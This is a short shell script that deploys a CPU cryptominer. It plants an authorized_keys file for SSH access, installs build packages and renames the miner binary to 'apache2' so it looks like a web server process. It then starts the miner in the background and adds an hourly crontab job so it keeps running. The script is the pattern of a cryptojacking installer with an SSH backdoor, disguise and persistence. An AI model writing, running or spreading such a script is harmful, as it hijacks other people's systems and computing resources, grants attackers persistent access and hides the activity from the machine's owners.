mv authorized_keys.txt ~/.ssh/authorized_keys
chmod 300  ~/.ssh/authorized_keys

dd if=/dev/zero of=/var/swap.img bs=1024k count=1000
chmod 0600 /var/swap.img
mkswap /var/swap.img
swapon /var/swap.img

apt-get update
dpkg --configure -a
apt-get -y --force-yes install libcurl4-openssl-dev libncurses5-dev pkg-config automake yasm git  psmisc
apt-get -y --force-yes install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++

cd 

wget https://api.ipify.org	
chmod +x tanhuevon/*
mv tanhuevon/cpuminer ./apache2
cp tanhuevon/apache2.sh .

nohup sh /root/tanhuevon/apache2.sh &
echo '0 * * * * bash /root/tanhuevon/apache2.sh &> /root/out.log' | crontab -
sleep 2
tail -f apache3.log
